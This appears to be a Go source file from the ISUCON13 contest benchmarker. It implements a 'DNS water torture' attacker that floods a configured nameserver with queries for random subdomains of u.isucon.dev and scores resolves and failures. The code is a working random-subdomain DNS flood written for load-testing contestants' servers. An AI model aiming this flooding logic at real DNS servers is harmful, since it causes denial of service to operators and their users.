package attacker

import (
	"context"
	"io"
	"math/rand"
	"net"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
	"unsafe"

	"github.com/isucon/isucon13/bench/internal/benchscore"
	"github.com/isucon/isucon13/bench/internal/config"
	"github.com/miekg/dns"
	"github.com/valyala/bytebufferpool"
)

// refers https://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-go

const (
	letters       = "abcdefghijklmnopqrstuvwxyz0123456789"
	letterIdxBits = 6
	letterIdxMask = 1<<letterIdxBits - 1
	letterIdxMax  = 63 / letterIdxBits
	zone          = "u.isucon.dev."
	maxLength     = 22
)

var src = rand.NewSource(time.Now().UnixNano())
var mutex sync.Mutex
var counter = uint64(1)

type DnsWaterTortureAttacker struct {
	connected               bool
	dnsClient               *dns.Client
	dnsConn                 *dns.Conn
	maxRequestPerConnection int
	requests                int
}

func int63() int64 {
	mutex.Lock()
	n := src.Int63()
	mutex.Unlock()
	return n
}

func randString(bb io.ByteWriter, n int) {
	for i, cache, remain := n-1, int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letters) {
			bb.WriteByte(letters[idx])
			i--
		}
		cache >>= letterIdxBits
		remain--
	}
}

func NewDnsWaterTortureAttacker() *DnsWaterTortureAttacker {
	c := &dns.Client{Net: "udp", Timeout: 1 * time.Second}
	return &DnsWaterTortureAttacker{
		maxRequestPerConnection: 100,
		requests:                0,
		dnsClient:               c,
	}
}

func (a *DnsWaterTortureAttacker) Attack(ctx context.Context) {
	buf := bytebufferpool.Get()
	defer bytebufferpool.Put(buf)
	numOfLabel := 1
	if atomic.AddUint64(&counter, 1); counter%50 == 0 {
		numOfLabel += rand.Intn(3)
	}
	for i := 0; i < numOfLabel; i++ {
		length := 10 + rand.Intn(maxLength)
		randString(buf, length)
		buf.WriteByte('.')
	}
	buf.WriteString(zone)
	b := buf.Bytes()
	a.lookup(ctx, unsafe.String(&b[0], len(b)))
}

var atomicId = uint64(1)
var msgPool = sync.Pool{
	New: func() any {
		msg := new(dns.Msg)
		msg.Question = make([]dns.Question, 1)
		msg.Question[0] = dns.Question{
			Qtype:  dns.TypeA,
			Qclass: dns.ClassINET,
		}
		return msg
	},
}

func (a *DnsWaterTortureAttacker) lookup(ctx context.Context, name string) {
	if !a.connected {
		nameserver := net.JoinHostPort(config.TargetNameserver, strconv.Itoa(config.DNSPort))
		dnsConn, _ := a.dnsClient.Dial(nameserver)
		a.connected = true
		a.dnsConn = dnsConn
	}

	msg := msgPool.Get().(*dns.Msg)
	defer msgPool.Put(msg)
	msg.Id = uint16(atomic.AddUint64(&atomicId, 1))
	msg.Question[0].Name = name
	msg.RecursionDesired = false

	a.requests++
	_, _, err := a.dnsClient.ExchangeWithConn(msg, a.dnsConn)
	if err != nil {
		a.dnsConn.Close()
		a.connected = false
		benchscore.IncDNSFailed()
		return
	}
	if a.requests >= a.maxRequestPerConnection {
		a.dnsConn.Close()
		a.connected = false
		a.requests = 0
	}
	// プロトコル上成功をカウントする
	benchscore.IncResolves()
}
